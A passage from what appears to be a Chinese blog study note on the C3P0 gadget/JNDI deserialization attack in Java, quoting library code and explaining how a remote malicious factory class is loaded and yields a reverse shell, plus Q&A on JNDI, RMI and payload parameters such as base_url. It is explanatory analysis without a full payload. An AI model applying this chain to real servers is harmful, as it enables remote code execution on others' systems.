<span class="line"><span style="color:#A6ACCD;">            nameContext </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Context</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> initialContext</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">lookup</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> contextName </span><span style="color:#89DDFF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> ReferenceableUtils</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">referenceToObject</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> reference</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> name</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> nameContext</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> env </span><span style="color:#89DDFF;">);</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#676E95;font-style:italic;">/* Leave out lots of codes for try-catch */</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span></code></pre></div></li><li><p>接下来看<code>ReferenceableUtils.referenceToObject()</code></p><ul><li>读取Reference中的classFactory(攻击者的恶意类名className)并赋值给fClassName</li><li>读取Reference中的classFactoryLocation(攻击者的恶意类URL地址classFactoryLocation)并赋值给fClassLocation</li><li>当用户设置了Reference的classFactoryLocation属性时，用该属性创建一个URLClassLoader</li><li>调用Class.forName()使用这个URLClassLoader加载指定名字的工厂类，此时提供恶意类的监听会打印出HTTP请求记录</li><li>fClass.newInstance()通过反射获取并调用了恶意类的构造方法创建该恶意类的实例，其过程中反弹shell到监听shell的攻击机，<strong>攻击完成</strong></li></ul><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">static</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Object</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">referenceToObject</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Reference</span><span style="color:#A6ACCD;"> ref</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Name</span><span style="color:#A6ACCD;"> name</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Context</span><span style="color:#A6ACCD;"> nameCtx</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Hashtable</span><span style="color:#A6ACCD;"> env</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> throws NamingException </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">	</span><span style="color:#89DDFF;font-style:italic;">try</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> fClassName </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> ref</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getFactoryClassName</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> fClassLocation </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> ref</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getFactoryClassLocation</span><span style="color:#89DDFF;">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">ClassLoader</span><span style="color:#A6ACCD;"> defaultClassLoader </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> Thread</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">currentThread</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getContextClassLoader</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> defaultClassLoader </span><span style="color:#89DDFF;">==</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">null</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">            defaultClassLoader </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> ReferenceableUtils</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">class</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getClassLoader</span><span style="color:#89DDFF;">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">ClassLoader</span><span style="color:#A6ACCD;"> cl</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> fClassLocation </span><span style="color:#89DDFF;">==</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">null</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">            cl </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> defaultClassLoader</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">else</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#C792EA;">URL</span><span style="color:#A6ACCD;"> u </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">URL</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> fClassLocation </span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            cl </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">URLClassLoader</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">URL</span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;"> u </span><span style="color:#89DDFF;">},</span><span style="color:#A6ACCD;"> defaultClassLoader </span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">Class</span><span style="color:#A6ACCD;"> fClass </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> Class</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">forName</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> fClassName</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">true,</span><span style="color:#A6ACCD;"> cl </span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">ObjectFactory</span><span style="color:#A6ACCD;"> of </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">ObjectFactory</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> fClass</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">newInstance</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> of</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getObjectInstance</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> ref</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> name</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> nameCtx</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> env </span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#676E95;font-style:italic;">/* Leave out lots of codes for try-catch */</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span></code></pre></div></li></ol><h2 id="独立思考" tabindex="-1">独立思考 <a class="header-anchor" href="#独立思考" aria-label="Permalink to &quot;独立思考&quot;">​</a></h2><h3 id="_1、javax-naming包是做什么用的" tabindex="-1">1、javax.naming包是做什么用的？ <a class="header-anchor" href="#_1、javax-naming包是做什么用的" aria-label="Permalink to &quot;1、javax.naming包是做什么用的？&quot;">​</a></h3><ul><li>javax.naming包为访问命名服务提供类和接口</li><li>该包下有几个比较显眼的接口 <ul><li><p>Context：代表了一个命名上下文，其中包含了存储name到object的映射关系的集合以及调用和更新这些映射关系的方法</p><ul><li>lookup(Name/String)获取一个命名对象</li><li>bind(Name/String, Object)新增一个名称-对象映射对</li><li>unbind(Name/String)删除一个指定名称的名称-对象映射对</li><li>rename(Name/String, Name/String)将绑定在旧名字上的对象绑定到新名字，并且对旧名字解除绑定</li><li>list(Name/String)枚举出Context中指定名称下的NameClassPair，NameClassPair实现了Serializable接口</li><li>listBindings(Name/String)枚举出Context指定名称下的Binding，Binding继承自NameClassPiar，相较于NameClassPair多了boundObj参数</li></ul></li><li><p>Name</p><ul><li><p>CompostiteName</p><ul><li>使用输入的字符串构造一个组合名称</li></ul></li><li><p>CompoundName</p><ul><li>使用输入的字符串构造一个复合名称</li></ul></li><li><p>LdapName</p><ul><li><p>可以接受任意名称，只有将名称发给LDAP服务器的时候才能知道名称是否有效</p></li><li><p>入参</p><ul><li>name：标识名称(例如<code>CN=Steve Kille, O=Isode Limited, C=GB</code>)</li></ul></li><li><p>构造函数</p><ul><li><p>unparsed：接收入参name</p></li><li><p>调用parse函数进行解析，将解析结果赋值给List&lt;Rdn&gt;的rnds属性(例如<code>{C=GB, O=Isode Limited, CN=Steve Kille}</code>)</p><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;">/* </span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> * 	LdapName.parse()</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *		Rfc2253Parser().parseDn()</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> */</span></span></code></pre></div></li></ul></li></ul></li><li><p>DnsName</p><ul><li>入参 <ul><li>name：URL域名</li></ul></li><li>构造函数 <ul><li>domain：将入参name赋值给domain</li><li>labels：以<code>.</code>为分隔拆分name存入ArrayList&lt;String&gt;</li></ul></li></ul></li></ul></li><li><p>NameParser</p><ul><li>用于解析用户输入的字符串名称，返回实现了Name接口的对象</li></ul></li><li><p>NamingEnumeration</p><ul><li>继承自<code>java.util.Enumeration</code>，用于枚举<code>javax.naming</code>包和<code>javax.naming.directory</code>包中方法返回的List对象</li></ul></li><li><p>Referenceable</p><ul><li>实现Referenceable接口的对象可以通过getReference()方法返回一个指向自己的Reference对象</li><li>Reference是一种记录那些没有直接绑定到命名系统中的对象的相关地址信息的一种方式。</li><li>在绑定一个对象时，如果这个对象实现了Referenceable接口，那么将会调用他的getReference()方法获取它的Reference对象用来绑定</li></ul></li></ul></li></ul><h3 id="_2-javax-naming-context和命名空间有什么区别" tabindex="-1">2. javax.naming.Context和命名空间有什么区别？ <a class="header-anchor" href="#_2-javax-naming-context和命名空间有什么区别" aria-label="Permalink to &quot;2. javax.naming.Context和命名空间有什么区别？&quot;">​</a></h3><ul><li><p>javax.naming.Context</p><ul><li>javax.naming.Context接口的实现类的每个对象都维护了一个自己的命名上下文</li><li>绑定的目标是对象，用于供框架内其他组件获取。</li></ul></li><li><p>命名空间</p><ul><li><p>每一个被加载的类有一个<code>**.class.getName()</code>，JVM为每一个ClassLoader维护一个命名空间且不支持将一个class重复加载到同一个命名空间。</p></li><li><p>绑定的目标是class，用于供JVM运行时调用</p><ul><li>URLClassLoader.findClass(name) 其中将类名的<code>.</code>替换为<code>/</code>之后在尾部拼接<code>.class</code></li><li>ClassLoader.defineClass1()是native方法，由C语言实现</li></ul><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;">/*</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> * 	URLClassLoader.findClass(name)</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> * 		URLClassLoader.defineClass(String name, Resource res)</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *			SecureClassLoader.defineClass(String name,byte[] b, int off, int len,CodeSource cs)</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *				ClassLoader.defineClass(String name, byte[] b, int off, int len,ProtectionDomain protectionDomain)</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> * 					ClassLoader.defineClass1(String name, byte[] b, int off, int len,ProtectionDomain pd, String source);</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> */</span></span></code></pre></div></li></ul></li></ul><h3 id="_3-referenceable和reference起什么作用" tabindex="-1">3. Referenceable和Reference起什么作用？ <a class="header-anchor" href="#_3-referenceable和reference起什么作用" aria-label="Permalink to &quot;3. Referenceable和Reference起什么作用？&quot;">​</a></h3><ul><li><p>Referenceable接口中仅有一个方法<code>Reference getReference() throws NamingException</code>，实现该接口的对象可以返回一个指向它本身的Reference对象。</p></li><li><p>Reference类记录了它指向对象的地址信息，是指向当前命名系统之外、对象的引用。</p><table><thead><tr><th>属性</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>className</td><td>String</td><td>所指向对象的类全限定名</td></tr><tr><td>addrs</td><td>Vector&lt;RefAddr&gt;</td><td>所指向对象的地址，通过构造器初始化</td></tr><tr><td>classFactory</td><td>String</td><td>所指向对象的工厂类的全限定名，默认初始化为空</td></tr><tr><td>classFactoryLocation</td><td>String</td><td>工厂类的位置，默认初始化为空</td></tr></tbody></table></li><li><p>RefAddr抽象类仅包含了addrType属性用于指定当前RefAddr的地址类型(如BSD Printer Address)，RefAddr的子类例如StringRefAddr其中包含了contents属性用于保存具体的地址信息</p></li></ul><h3 id="_4-jndi是做什么用的" tabindex="-1">4. JNDI是做什么用的？ <a class="header-anchor" href="#_4-jndi是做什么用的" aria-label="Permalink to &quot;4. JNDI是做什么用的？&quot;">​</a></h3><ul><li>定义 <ul><li>Java Naming Dictionary Interface是Java命名和目录服务接口</li><li>目录服务是命名服务的扩展，两者的区别是目录服务中的对象可以有属性，命名服务没有属性，在目录服务中，可以根据属性搜索对象。</li></ul></li><li>功能 <ul><li>访问文件系统中的文件</li><li>定位远程RMI注册的对象</li><li>访问LDAP目录服务</li></ul></li><li>攻击可用性 <ul><li>JNDI的<code>com.sun.jndi</code>包存储在<code>rt.jar</code>中，Java运行时中均可以反序列化出该包下的对象</li></ul></li></ul><h3 id="_5-java-rmi是干什么用的" tabindex="-1">5. java.rmi是干什么用的？ <a class="header-anchor" href="#_5-java-rmi是干什么用的" aria-label="Permalink to &quot;5. java.rmi是干什么用的？&quot;">​</a></h3><ul><li>定义</li><li>功能</li><li>实现 <ul><li><code>com.sun.jndi.rmi.registry.RegistryContext</code>实现了<code>javax.naming.Context</code>接口，是RMI服务的入口 <ul><li>构造函数<code>RegistryContext(String host, int port, Hashtable&lt;?, ?&gt; env)</code>接受域名、端口、和一个Hashtable&lt;String, Object&gt;的environments参数</li><li><code>lookup(Name name)</code>，根据传入的名字通过调用它内部属性registry.lookup()从Registry中获取对象进行解码后返回</li><li><code>decode(Remote r, Name name)</code>解码从Registry中获取到的对象 <ul><li>首先如果对象是RemoteReference类型，首先对RemoteReference进行解封装</li><li>然后调用<code>NamingManager.getObjectInstance(Object refInfo, Name name, Context nameCtx, Hashtable\\&lt;?,?\\&gt; environment)</code>获取对象实例</li></ul></li></ul></li><li><code>java.rmi.registry.Registry</code>是一个指向简单远程对象注册的远程接口，它提供了存储和获取指定名字绑定的远程对象引用</li></ul></li><li>攻击可用性 <ul><li><code>com.sun.jndi.rmi.registry</code>和<code>java.rmi</code>两个包均存储在<code>rt.jar</code>中，Java运行时均可反序列化出该包下的对象</li></ul></li></ul><h3 id="_6-为什么c3p0的payload构造参数使用的是base-url和classname" tabindex="-1">6. 为什么C3P0的Payload构造参数使用的是base_url和classname？ <a class="header-anchor" href="#_6-为什么c3p0的payload构造参数使用的是base-url和classname" aria-label="Permalink to &quot;6. 为什么C3P0的Payload构造参数使用的是base_url和classname？&quot;">​</a></h3><ul><li><p>base_url：用于提供恶意类的URL，之后会用于构建URLClassLoader</p><blockquote><p>在实践中，发现如果URL如果只写成<a href="http://ip" target="_blank" rel="noreferrer">http://ip</a>:port是无法获取到类的，在最后加上一个目录分隔符<a href="http://ip" target="_blank" rel="noreferrer">http://ip</a>:port/才可以完成攻击，目前这部分的原因还不清楚</p></blockquote></li><li><p>classname：在攻击过程中会被赋值给Reference的工厂类名classFactory属性，后续会用于获取恶意类，因为我们构造Payload过程中将恶意类名赋值给了Reference的工厂类名属性，而在构造Payload过程中生成Reference时Reference的classname属性在攻击过程中并没有用到，只需要将恶意类传给工厂类名属性让靶机获取工厂类并实例化即可实现攻击，无需再通过实例化后的工厂类调用<code>getObjectInstance()</code>方法根据Reference对象中的classname再去创建一次对象，<strong>这也是靶机在被攻击后报错的原因</strong>，靶机试图调用恶意类的<code>getObjectInstance()</code>失败。</p></li><li><p>C3P0 Payload构造参数中的classname并不是Reference类中的classname属性，<strong>这一点可能是理解C3P0攻击原理的一个障碍</strong>。</p></li></ul><h2 id="产生过的疑问" tabindex="-1">产生过的疑问 <a class="header-anchor" href="#产生过的疑问" aria-label="Permalink to &quot;产生过的疑问&quot;">​</a></h2><ol><li>javax.naming包是做什么用的？</li><li>javax.naming.Context和命名空间有什么区别？</li><li>Referencable和Reference起什么作用？</li><li>JNDI是做什么用的？</li><li>java.rmi是干什么用的？</li><li>为什么C3P0的Payload构造参数使用的是base_url和classname？</li></ol>`,22),r=[c];function i(D,y,C,A,F,d){return a(),l("div",null,r)}const f=s(t,[["render",i]]);export{m as __pageData,f as default};
